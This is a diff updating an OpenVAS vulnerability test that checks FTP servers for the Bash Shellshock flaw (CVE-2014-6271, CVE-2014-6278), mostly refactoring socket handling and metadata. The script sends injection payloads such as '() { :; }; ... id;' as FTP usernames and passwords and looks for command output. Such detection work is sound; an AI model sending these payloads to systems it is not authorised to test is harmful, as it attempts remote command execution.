@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_bash_shellshock_pure-ftpd_remote_cmd_exec_vuln.nasl 11868 2018-10-12 10:53:07Z cfischer $
+# $Id: gb_bash_shellshock_pure-ftpd_remote_cmd_exec_vuln.nasl 13508 2019-02-06 15:34:32Z cfischer $
 #
 # GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105094");
-  script_version("$Revision: 11868 $");
+  script_version("$Revision: 13508 $");
   script_cve_id("CVE-2014-6271", "CVE-2014-6278");
   script_bugtraq_id(70103);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:53:07 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-06 16:34:32 +0100 (Wed, 06 Feb 2019) $");
   script_tag(name:"creation_date", value:"2014-09-30 11:47:16 +0530 (Tue, 30 Sep 2014)");
 
   script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability (FTP Check)");
@@ -59,34 +59,36 @@ if(description)
   script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
   script_xref(name:"URL", value:"https://blogs.akamai.com/2014/09/environment-bashing.html");
   script_xref(name:"URL", value:"https://community.qualys.com/blogs/securitylabs/2014/09/24/");
+  script_xref(name:"URL", value:"http://www.gnu.org/software/bash/");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("find_service.nasl", "ftpserver_detect_type_nd_version.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_xref(name:"URL", value:"http://www.gnu.org/software/bash/");
   exit(0);
 }
 
 include("ftp_func.inc");
 include("misc_func.inc");
 
-port = get_ftp_port( default:21 );
-
 id_users = make_list( '() { :; }; export PATH=/bin:/usr/bin; echo; echo; id;',
                       '() { _; } >_[$($())] {  export PATH=/bin:/usr/bin; echo; echo; id;; }' );
+
+port = get_ftp_port( default:21 );
 
 foreach id_user ( id_users )
 {
   id_pass = id_user;
 
-  soc = open_sock_tcp( port );
-  if( ! soc ) break;
+  soc = ftp_open_socket( port:port );
+  if( ! soc )
+    break;
 
   send(socket:soc, data:'USER ' + id_user + '\r\n');
   recv = recv( socket:soc, length:1024 );
@@ -94,14 +96,13 @@ foreach id_user ( id_users )
   send(socket:soc, data:'PASS ' + id_pass + '\r\n');
   recv += recv( socket:soc, length:1024 );
 
-  close( soc );
+  ftp_close( socket:soc );
 
   if( recv =~ "uid=[0-9]+.*gid=[0-9]+.*" )
   {
     VULN = TRUE;
     break;
   }
-
 }
 
 if( ! VULN )
@@ -116,9 +117,9 @@ if( ! VULN )
 
   foreach user ( p_users )
   {
-
-    soc = open_sock_tcp( port );
-    if( ! soc ) exit( 0 );
+    soc = ftp_open_socket( port:port );
+    if( ! soc )
+      break;
 
     pass = user;
 
@@ -130,9 +131,10 @@ if( ! VULN )
                         data:"",
                         pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() )
                        );
-    close( soc );
+    ftp_close( socket:soc );
 
-    if( ! res  ) continue;
+    if( ! res  )
+      continue;
 
     data = get_icmp_element( icmp:res, element:"data" );
 
